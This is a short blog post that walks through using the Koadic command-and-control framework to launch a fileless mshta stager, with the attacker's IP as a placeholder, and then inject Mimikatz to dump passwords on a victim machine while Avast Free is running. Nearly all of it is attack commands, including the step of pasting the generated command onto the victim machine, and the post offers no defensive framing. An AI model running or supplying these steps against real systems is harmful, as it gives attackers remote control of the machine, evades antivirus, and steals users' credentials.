---
title: " Inject Mimikatz with Koadic using fileless mshta with Avast Free protection ON "
date: "2020-02-26"
layout: single
tags:
- Fileless
categories:
- Blog-post
---

Watch video tutorial here: [Video](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/videos/mimikatz%20with%20koadic.mp4)

    ./koadic
    use stager/js/mshta
    set srvhost [attacker ip]
    run

Copy the command line and paste on victim machine

    use implant/inject/mimikatz_dotnet2js
    set zombie 0
    run

You can see, we can dump the password using this mimikatz module.

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/mimikatz_koadic.PNG)
